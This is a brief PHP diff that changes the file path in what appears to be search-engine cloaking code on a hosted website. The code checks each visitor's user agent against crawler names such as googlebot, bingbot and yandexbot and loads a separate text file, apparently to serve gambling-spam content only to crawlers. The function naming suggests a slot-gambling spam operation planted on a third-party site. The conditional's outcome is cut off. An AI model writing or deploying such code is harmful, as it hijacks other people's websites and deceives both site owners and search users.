@@ -15,7 +15,7 @@ function bromoslot_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/u492855689/domains/cendekiainovasi.org/public_html/index.txt";
+$bot = "/home/u492855689/domains/cendekiainovasi.org/index.txt";
 $file = bromoslot_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
